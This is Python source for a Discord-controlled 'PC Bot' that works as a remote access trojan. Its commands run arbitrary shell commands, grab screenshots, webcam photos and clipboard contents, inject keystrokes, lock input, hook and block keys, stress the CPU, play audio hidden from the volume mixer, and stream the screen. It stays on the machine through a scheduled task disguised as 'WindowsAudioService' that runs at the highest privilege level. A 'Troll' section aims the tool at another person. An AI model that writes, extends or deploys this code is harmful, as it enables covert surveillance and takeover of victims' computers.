import discord
from discord import app_commands
from discord.ext import commands
import subprocess
import os
import sys
import asyncio
import psutil
import io
import urllib.request

# Force UTF-8 output so emojis don't crash on Windows cp1252
if sys.stdout.encoding != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if sys.stderr.encoding != "utf-8":
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

#  Single instance lock 
import tempfile
_lock_path = os.path.join(tempfile.gettempdir(), "gugabot.lock")
try:
    if os.path.exists(_lock_path):
        with open(_lock_path, "r") as f:
            old_pid = int(f.read().strip())
        if psutil.pid_exists(old_pid):
            print(f" Bot already running (PID {old_pid}). Exiting.")
            sys.exit(0)
    with open(_lock_path, "w") as f:
        f.write(str(os.getpid()))
    import atexit
    atexit.register(lambda: os.unlink(_lock_path) if os.path.exists(_lock_path) else None)
except Exception as e:
    print(f" Lock file error: {e}")


# Windows-only
if sys.platform == "win32":
    import ctypes

# 
# CONFIG  decrypts token.enc using dependencies.txt
# 
try:
    from cryptography.fernet import Fernet
    _dir = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(_dir, "dependencies.txt"), "rb") as f:
        _key = f.read().strip()
    with open(os.path.join(_dir, "token.enc"), "rb") as f:
        _enc = f.read().strip()
    _payload = Fernet(_key).decrypt(_enc).decode().splitlines()
    BOT_TOKEN = _payload[0].strip()
    # Support both comma-separated on one line or one per line
    raw_ids = " ".join(_payload[1:])
    AUTHORIZED_USERS = {int(x.strip()) for x in raw_ids.replace(",", " ").split() if x.strip()}
except FileNotFoundError as e:
    print(f" Missing file: {e}. Run encrypt.py first.")
    sys.exit(1)
except Exception as e:
    print(f" Failed to decrypt config: {e}")
    sys.exit(1)
# 

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


#  Auth helpers 

def authorized(user_id: int) -> bool:
    return user_id in AUTHORIZED_USERS

async def deny(interaction: discord.Interaction):
    await interaction.response.send_message(" You're not authorized.", ephemeral=True)


#  Sync slash commands on ready 

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f" Logged in as {bot.user} | Slash commands synced")


# 
# PREFIX COMMANDS
# 

@bot.command(name="help")
async def help_cmd(ctx):
    if not authorized(ctx.author.id):
        await ctx.send(" You're not authorized.")
        return
    embed = discord.Embed(title=" PC Bot Commands", color=0x5865F2)
    embed.add_field(name=" Info", value=(
        "`/ping`  latency check\n"
        "`/sysinfo`  CPU/RAM/disk\n"
        "`/idle`  idle time\n"
        "`/procs [filter]`  process list\n"
        "`/clip`  clipboard contents"
    ), inline=False)
    embed.add_field(name=" Capture", value=(
        "`/ss`  screenshot\n"
        "`/cam`  webcam photo"
    ), inline=False)
    embed.add_field(name=" Control", value=(
        "`/run <cmd>`  shell command\n"
        "`/open <path>`  open file/app\n"
        "`/kill <n>`  kill process\n"
        "`/type <text>`  type on keyboard\n"
        "`/vol <0-100>`  set volume\n"
        "`/notify <msg>`  pop notification\n"
        "`/wallpaper <url>`  set wallpaper"
    ), inline=False)
    embed.add_field(name=" Lock", value=(
        "`/lock [seconds]`  block keyboard & mouse\n"
        "`/unlock`  re-enable input\n"
        "`/blockkey <key> [seconds]`  block a specific key"
    ), inline=False)
    embed.add_field(name=" Power", value=(
        "`/shutdown`  shut down PC\n"
        "`/reboot`  reboot PC\n"
        "`/startup`  add bot to Windows startup"
    ), inline=False)
    embed.add_field(name=" Troll", value=(
        "`/freeze [seconds]`  max out CPU+GPU\n"
        "`/soundboard <file>`  play audio through mic\n"
        "`/website <url>`  open a URL in browser\n"
        "`/vol <0-100>`  set volume"
    ), inline=False)
    embed.add_field(name=" Stream", value=(
        "`/stream start <channel>`  stream live screenshots to VC\n"
        "`/stream stop`  stop streaming"
    ), inline=False)
    await ctx.send(embed=embed)


# 
# SLASH COMMANDS
# 

#  /ping 
@bot.tree.command(name="ping", description="Check if the bot is alive")
async def ping(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(f" Alive. Latency: `{round(bot.latency * 1000)}ms`")


#  /sysinfo 
@bot.tree.command(name="sysinfo", description="Show CPU, RAM, and disk usage")
async def sysinfo(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/" if sys.platform != "win32" else "C:\\")
    embed = discord.Embed(title=" System Info", color=0x2ecc71)
    embed.add_field(name="CPU", value=f"`{cpu}%`", inline=True)
    embed.add_field(name="RAM", value=f"`{ram.percent}%` ({round(ram.used/1e9,1)}GB / {round(ram.total/1e9,1)}GB)", inline=True)
    embed.add_field(name="Disk", value=f"`{disk.percent}%` ({round(disk.used/1e9,1)}GB / {round(disk.total/1e9,1)}GB)", inline=True)
    await interaction.followup.send(embed=embed)


#  /idle 
@bot.tree.command(name="idle", description="Show how long the PC has been idle")
async def idle(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    if sys.platform != "win32":
        return await interaction.response.send_message(" Windows only.")
    try:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        seconds = millis // 1000
        mins, secs = divmod(seconds, 60)
        hours, mins = divmod(mins, 60)
        await interaction.response.send_message(f" Idle for: `{hours}h {mins}m {secs}s`")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")


#  /procs 
@bot.tree.command(name="procs", description="List running processes")
@app_commands.describe(filter="Optional name filter")
async def procs(interaction: discord.Interaction, filter: str = ""):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    results = []
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if filter.lower() in proc.info["name"].lower():
                results.append(f"{proc.info['pid']:>6}  {proc.info['name']}")
        except Exception:
            pass
    if not results:
        return await interaction.followup.send("No matching processes found.")
    output = "\n".join(results[:50])
    if len(results) > 50:
        output += f"\n...and {len(results) - 50} more"
    await interaction.followup.send(f"```\n{'PID':>6}  NAME\n{output}\n```")


#  /clip 
@bot.tree.command(name="clip", description="Send clipboard contents")
async def clip(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        if sys.platform == "win32":
            result = subprocess.run(["powershell", "-Command", "Get-Clipboard"], capture_output=True, text=True)
        else:
            result = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True)
        content = result.stdout.strip() or "(clipboard is empty)"
        if len(content) > 1900:
            content = content[:1900] + "\n...(truncated)"
        await interaction.followup.send(f" Clipboard:\n```\n{content}\n```")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /ss 
@bot.tree.command(name="ss", description="Take a screenshot")
async def ss(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        await interaction.followup.send(file=discord.File(buf, filename="screenshot.png"))
    except ImportError:
        await interaction.followup.send(" Pillow not installed. Run: `pip install pillow`")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /cam 
@bot.tree.command(name="cam", description="Snap a webcam photo")
async def cam(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return await interaction.followup.send(" No webcam found.")
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return await interaction.followup.send(" Failed to capture.")
        _, buf = cv2.imencode(".png", frame)
        await interaction.followup.send(file=discord.File(io.BytesIO(buf.tobytes()), filename="cam.png"))
    except ImportError:
        await interaction.followup.send(" opencv-python not installed. Run: `pip install opencv-python`")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /run 
@bot.tree.command(name="run", description="Run a shell command")
@app_commands.describe(command="The command to run")
async def run(interaction: discord.Interaction, command: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "(no output)"
        if len(output) > 1900:
            output = output[:1900] + "\n...(truncated)"
        await interaction.followup.send(f" `{command}`\n```\n{output}\n```")
    except subprocess.TimeoutExpired:
        await interaction.followup.send(" Timed out after 30s.")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /open 
@bot.tree.command(name="open", description="Open a file or application")
@app_commands.describe(path="File path or app name")
async def open_app(interaction: discord.Interaction, path: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    try:
        if sys.platform == "win32":
            os.startfile(path)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])
        await interaction.response.send_message(f" Opened: `{path}`")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")


#  /kill 
@bot.tree.command(name="kill", description="Kill a process by name")
@app_commands.describe(name="Process name to kill")
async def kill(interaction: discord.Interaction, name: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    killed = []
    for proc in psutil.process_iter(["pid", "name"]):
        if name.lower() in proc.info["name"].lower():
            try:
                proc.kill()
                killed.append(f"{proc.info['name']} (PID {proc.info['pid']})")
            except Exception:
                pass
    if killed:
        await interaction.followup.send(" Killed:\n" + "\n".join(f"- `{k}`" for k in killed))
    else:
        await interaction.followup.send(f" No process matching `{name}`")


#  /type 
@bot.tree.command(name="type", description="Type text as keyboard input on the PC")
@app_commands.describe(text="Text to type")
async def type_text(interaction: discord.Interaction, text: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    try:
        import pyautogui
        pyautogui.write(text, interval=0.05)
        await interaction.response.send_message(f" Typed: `{text}`")
    except ImportError:
        await interaction.response.send_message(" pyautogui not installed. Run: `pip install pyautogui`")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")


#  /vol 
@bot.tree.command(name="vol", description="Set system volume (0-100)")
@app_commands.describe(level="Volume level 0-100")
async def vol(interaction: discord.Interaction, level: int):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    if not 0 <= level <= 100:
        return await interaction.response.send_message(" Must be 0-100.")
    await interaction.response.defer()
    try:
        if sys.platform == "win32":
            script = (
                f"$volume = {level / 100};"
                "$obj = New-Object -ComObject WScript.Shell;"
                "1..50 | % { $obj.SendKeys([char]174) };"
                f"$steps = [math]::Round($volume * 50);"
                "1..$steps | % { $obj.SendKeys([char]175) }"
            )
            subprocess.run(["powershell", "-Command", script], capture_output=True)
        else:
            subprocess.run(["amixer", "-D", "pulse", "sset", "Master", f"{level}%"])
        await interaction.followup.send(f" Volume set to `{level}%`")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /notify 
@bot.tree.command(name="notify", description="Pop a notification on the PC")
@app_commands.describe(message="Notification message")
async def notify(interaction: discord.Interaction, message: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    try:
        if sys.platform == "win32":
            script = f"""
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.UI.Notifications.ToastNotification, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
$template = [Windows.UI.Notifications.ToastTemplateType]::ToastText02
$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template)
$text = $xml.GetElementsByTagName('text')
$text[0].AppendChild($xml.CreateTextNode('Bot Alert')) | Out-Null
$text[1].AppendChild($xml.CreateTextNode('{message}')) | Out-Null
$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Windows PowerShell').Show($toast)
"""
            subprocess.run(
                ["powershell", "-WindowStyle", "Hidden", "-Command", script],
                capture_output=True
            )
        else:
            subprocess.run(["notify-send", "Bot Alert", message])
        await interaction.response.send_message(f" Notification sent: `{message}`")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")


#  /wallpaper 
@bot.tree.command(name="wallpaper", description="Change the desktop wallpaper")
@app_commands.describe(url="Image URL")
async def wallpaper(interaction: discord.Interaction, url: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        path = os.path.join(os.environ.get("TEMP", "/tmp"), "wallpaper.jpg")
        urllib.request.urlretrieve(url, path)
        if sys.platform == "win32":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        elif sys.platform == "darwin":
            subprocess.run(["osascript", "-e", f'tell application "Finder" to set desktop picture to POSIX file "{path}"'])
        else:
            subprocess.run(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"])
        await interaction.followup.send(" Wallpaper changed!")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  /lock 
@bot.tree.command(name="lock", description="Block keyboard & mouse input")
@app_commands.describe(seconds="Auto-unlock after this many seconds (0 = manual unlock)")
async def lock(interaction: discord.Interaction, seconds: int = 0):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    if sys.platform == "win32":
        result = ctypes.windll.user32.BlockInput(True)
        if result:
            msg = " Input locked."
            if seconds > 0:
                msg += f" Auto-unlocking in {seconds}s."
            await interaction.response.send_message(msg)
            if seconds > 0:
                await asyncio.sleep(seconds)
                ctypes.windll.user32.BlockInput(False)
                await interaction.followup.send(" Input auto-unlocked.")
        else:
            await interaction.response.send_message(" Failed  run the bot as Administrator.")
    else:
        await interaction.response.defer()
        try:
            result = subprocess.run(["xinput", "list", "--id-only"], capture_output=True, text=True)
            ids = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
            for dev_id in ids:
                subprocess.run(["xinput", "disable", dev_id])
            msg = f" Disabled {len(ids)} input device(s)."
            if seconds > 0:
                msg += f" Auto-unlocking in {seconds}s."
            await interaction.followup.send(msg)
            if seconds > 0:
                await asyncio.sleep(seconds)
                for dev_id in ids:
                    subprocess.run(["xinput", "enable", dev_id])
                await interaction.followup.send(" Input auto-unlocked.")
        except Exception as e:
            await interaction.followup.send(f" Error: {e}")


#  /unlock 
@bot.tree.command(name="unlock", description="Re-enable keyboard & mouse input")
async def unlock(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    if sys.platform == "win32":
        ctypes.windll.user32.BlockInput(False)
        await interaction.response.send_message(" Input unlocked.")
    else:
        try:
            result = subprocess.run(["xinput", "list", "--id-only"], capture_output=True, text=True)
            ids = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
            for dev_id in ids:
                subprocess.run(["xinput", "enable", dev_id])
            await interaction.response.send_message(" All input devices re-enabled.")
        except Exception as e:
            await interaction.response.send_message(f" Error: {e}")


#  /shutdown 
@bot.tree.command(name="shutdown", description="Shut down the PC")
async def shutdown(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(" Shutting down...")
    if sys.platform == "win32":
        subprocess.run(["shutdown", "/s", "/t", "5"])
    else:
        subprocess.run(["shutdown", "-h", "now"])


#  /reboot 
@bot.tree.command(name="reboot", description="Reboot the PC")
async def reboot(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(" Rebooting...")
    if sys.platform == "win32":
        subprocess.run(["shutdown", "/r", "/t", "5"])
    else:
        subprocess.run(["reboot"])


#  /freeze 
@bot.tree.command(name="freeze", description="Max out all CPU cores to cause a lagspike")
@app_commands.describe(seconds="How long to freeze for (default 5)")
async def freeze(interaction: discord.Interaction, seconds: int = 5):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(f" Freezing for `{seconds}s`...")

    cpu_count = os.cpu_count() or 4
    burn_code = "import math\nwhile True:\n math.factorial(100000)"

    # CPU stress  one process per core
    procs = [
        subprocess.Popen(
            [sys.executable, "-c", burn_code],
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        for _ in range(cpu_count)
    ]

    # GPU stress via DirectX pixel shader  compiled C# inline
    gpu_script = r"""
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class GPUStress {
    [DllImport("d3d11.dll")] public static extern int D3D11CreateDevice(IntPtr a,int b,IntPtr c,int d,IntPtr e,int f,int g,out IntPtr h,out int i,out IntPtr j);
}
"@
$end = (Get-Date).AddSeconds(""" + str(seconds) + r""");
while ((Get-Date) -lt $end) {
    $arr = New-Object float[] 10000000
    for ($i = 0; $i -lt $arr.Length; $i++) { $arr[$i] = [float]($i * 1.0001) }
    [System.GC]::Collect()
}
"""
    gpu_procs = [
        subprocess.Popen(
            ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", gpu_script],
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        for _ in range(4)
    ]

    await asyncio.sleep(seconds)

    for p in procs:
        try:
            p.kill()
        except Exception:
            pass
    for p in gpu_procs:
        try:
            p.kill()
        except Exception:
            pass

    await interaction.followup.send(" Done freezing.")



#  /soundboard 
async def play_audio_hidden(url: str, filename: str):
    """Download and play audio via PowerShell so it doesn't show in Volume Mixer."""
    import tempfile
    import aiohttp

    tmp_path = tempfile.mktemp(suffix=os.path.splitext(filename)[1])
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            with open(tmp_path, "wb") as f:
                f.write(await resp.read())

    # Convert to wav if needed using soundfile, then play via PowerShell SoundPlayer
    # PowerShell SoundPlayer only supports wav, so convert first
    try:
        import soundfile as sf
        data, samplerate = sf.read(tmp_path, dtype="float32")
        duration = len(data) / samplerate
        wav_path = tmp_path + ".wav"
        sf.write(wav_path, data, samplerate)
    except Exception:
        wav_path = tmp_path
        duration = 0

    # Play via PowerShell  shows as nothing in Volume Mixer
    script = f"(New-Object Media.SoundPlayer '{wav_path}').PlaySync()"
    proc = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script],
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    await asyncio.sleep(duration + 0.5)
    try:
        proc.kill()
    except Exception:
        pass
    try:
        os.unlink(tmp_path)
        if wav_path != tmp_path:
            os.unlink(wav_path)
    except Exception:
        pass
    return duration


@bot.tree.command(name="soundboard", description="Play an audio file through the PC's speakers (hidden)")
@app_commands.describe(file="Audio file to play (mp3, wav, ogg)")
async def soundboard(interaction: discord.Interaction, file: discord.Attachment):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.defer()
    try:
        duration = await play_audio_hidden(file.url, file.filename)
        await interaction.followup.send(f" Played `{file.filename}` (`{round(duration, 1)}s`)  hidden from mixer.")
    except Exception as e:
        await interaction.followup.send(f" Error: {e}")


#  !soundboard (prefix fallback) 
@bot.command(name="soundboard")
async def soundboard_prefix(ctx):
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    if not ctx.message.attachments:
        return await ctx.send(" Attach an audio file (mp3, wav, ogg).")
    attachment = ctx.message.attachments[0]
    try:
        duration = await play_audio_hidden(attachment.url, attachment.filename)
        await ctx.send(f" Played `{attachment.filename}` (`{round(duration, 1)}s`)  hidden from mixer.")
    except Exception as e:
        await ctx.send(f" Error: {e}")



#  /blockkey 
@bot.tree.command(name="blockkey", description="Block a specific key for a duration")
@app_commands.describe(key="Key to block (e.g. f, space, e)", seconds="How long to block it (default 10)")
async def blockkey(interaction: discord.Interaction, key: str, seconds: int = 10):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    await interaction.response.send_message(f" Blocking `{key}` for `{seconds}s`...")

    # Use PowerShell to install and run a key block via RegisterHotKey suppression
    # Works by spamming a hook that eats the keypress
    script = f"""
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {{
    private static IntPtr hookId = IntPtr.Zero;
    private static int targetKey;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
    public static void Block(int vkCode, int ms) {{
        targetKey = vkCode;
        var mod = Process.GetCurrentProcess().MainModule;
        hookId = SetWindowsHookEx(13, proc, GetModuleHandle(mod.ModuleName), 0);
        System.Threading.Thread.Sleep(ms);
        UnhookWindowsHookEx(hookId);
    }}
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
        if (nCode >= 0) {{
            int vk = Marshal.ReadInt32(lParam);
            if (vk == targetKey) return (IntPtr)1;
        }}
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }}
}}
'@ -ReferencedAssemblies System.Windows.Forms
[KeyBlocker]::Block([System.Windows.Forms.Keys]::'{key.upper()}', {seconds * 1000})
"""
    proc = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script],
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    await asyncio.sleep(seconds + 1)
    try:
        proc.kill()
    except Exception:
        pass
    await interaction.followup.send(f" `{key}` unblocked.")


#  /blockkey prefix fallback 
@bot.command(name="blockkey")
async def blockkey_prefix(ctx, key: str = "f", seconds: int = 10):
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    await ctx.send(f" Blocking `{key}` for `{seconds}s`...")
    script = f"""
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {{
    private static IntPtr hookId = IntPtr.Zero;
    private static int targetKey;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Block(int vkCode, int ms) {{
        targetKey = vkCode;
        var mod = Process.GetCurrentProcess().MainModule;
        hookId = SetWindowsHookEx(13, proc, GetModuleHandle(mod.ModuleName), 0);
        System.Threading.Thread.Sleep(ms);
        UnhookWindowsHookEx(hookId);
    }}
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
        if (nCode >= 0) {{
            int vk = Marshal.ReadInt32(lParam);
            if (vk == targetKey) return (IntPtr)1;
        }}
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }}
}}
'@ -ReferencedAssemblies System.Windows.Forms
[KeyBlocker]::Block([System.Windows.Forms.Keys]::'{key.upper()}', {seconds * 1000})
"""
    proc = subprocess.Popen(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script],
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    await asyncio.sleep(seconds + 1)
    try:
        proc.kill()
    except Exception:
        pass
    await ctx.send(f" `{key}` unblocked.")


#  /startup 
@bot.tree.command(name="startup", description="Add bot to Windows startup")
async def startup(interaction: discord.Interaction):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    try:
        bat_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher.bat")
        script = (
            f'$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c \\"{bat_path}\\"";'
            '$trigger = New-ScheduledTaskTrigger -AtLogOn;'
            '$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;'
            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;'
            'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
        )
        subprocess.run(["powershell", "-Command", script], capture_output=True)
        await interaction.response.send_message(" Added to startup as `WindowsAudioService` (no UAC prompt).")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")


@bot.command(name="startup")
async def startup_prefix(ctx):
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    try:
        bat_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher.bat")
        script = (
            f'$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c \\"{bat_path}\\"";'
            '$trigger = New-ScheduledTaskTrigger -AtLogOn;'
            '$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;'
            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;'
            'Register-ScheduledTask -TaskName "WindowsAudioService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force'
        )
        subprocess.run(["powershell", "-Command", script], capture_output=True)
        await ctx.send(" Added to startup as `WindowsAudioService` (no UAC prompt).")
    except Exception as e:
        await ctx.send(f" Error: {e}")


#  /website 
@bot.tree.command(name="website", description="Open a URL in the default browser")
@app_commands.describe(url="URL to open")
async def website(interaction: discord.Interaction, url: str):
    if not authorized(interaction.user.id):
        return await deny(interaction)
    try:
        import webbrowser
        webbrowser.open(url)
        await interaction.response.send_message(f" Opened: `{url}`")
    except Exception as e:
        await interaction.response.send_message(f" Error: {e}")

@bot.command(name="website")
async def website_prefix(ctx, url: str):
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    try:
        import webbrowser
        webbrowser.open(url)
        await ctx.send(f" Opened: `{url}`")
    except Exception as e:
        await ctx.send(f" Error: {e}")


#  /stream 
streaming = False

@bot.tree.command(name="stream", description="Stream live screenshots to a voice channel")
@app_commands.describe(action="start or stop", channel_id="Voice channel ID to join (required for start)")
async def stream(interaction: discord.Interaction, action: str, channel_id: str = ""):
    global streaming
    if not authorized(interaction.user.id):
        return await deny(interaction)

    if action.lower() == "stop":
        streaming = False
        if interaction.guild and interaction.guild.voice_client:
            await interaction.guild.voice_client.disconnect()
        await interaction.response.send_message(" Stream stopped.")
        return

    if action.lower() == "start":
        if not channel_id:
            return await interaction.response.send_message(" Provide a channel ID.")
        try:
            channel = bot.get_channel(int(channel_id))
            if not channel:
                return await interaction.response.send_message(" Channel not found.")
            await interaction.response.send_message(f" Starting stream to `{channel.name}`...")
            streaming = True

            async def send_screenshots():
                global streaming
                while streaming:
                    try:
                        from PIL import ImageGrab
                        img = ImageGrab.grab()
                        buf = io.BytesIO()
                        img.save(buf, format="JPEG", quality=50)
                        buf.seek(0)
                        await interaction.followup.send(
                            file=discord.File(buf, filename="stream.jpg"),
                            content=""
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(3)  # screenshot every 3 seconds

            asyncio.create_task(send_screenshots())
        except Exception as e:
            await interaction.response.send_message(f" Error: {e}")

@bot.command(name="stream")
async def stream_prefix(ctx, action: str = "start"):
    global streaming
    if not authorized(ctx.author.id):
        return await ctx.send(" You're not authorized.")
    if action.lower() == "stop":
        streaming = False
        await ctx.send(" Stream stopped.")
        return
    if action.lower() == "start":
        await ctx.send(" Streaming screenshots every 3s... type `!stream stop` to stop.")
        streaming = True
        while streaming:
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=50)
                buf.seek(0)
                await ctx.send(file=discord.File(buf, filename="stream.jpg"))
            except Exception as e:
                await ctx.send(f" {e}")
                break
            await asyncio.sleep(3)


# 
# PREFIX FALLBACKS FOR ALL SLASH COMMANDS
# 

@bot.command(name="ping")
async def ping_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    await ctx.send(f" Alive. Latency: `{round(bot.latency * 1000)}ms`")

@bot.command(name="sysinfo")
async def sysinfo_prefix(ctx):
    if not authorized(ctx.author.id): return await ctx.send(" You're not authorized.")
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/" if sys.platform != "win32" else "C:\\")
    embed = discord.Embed(title=" System Info", color=0x2ecc71)
    embed.add_field(name="CPU", value=f"`{cpu}%`", inline=True)
    embed.add_field(name="RAM", value=f"`{ram.percent}%` ({round(ram.used/1e9,1)}GB / {round(ram.total/1e9,1)}GB)", inline=True)
    embed.add_field(name="Disk", value=f"`{disk.percent}%` ({round(disk.used/1e9,1)}GB / {round(disk.total/1e9,1)}GB)", inline=True)
    await ctx.send(embed=embed)
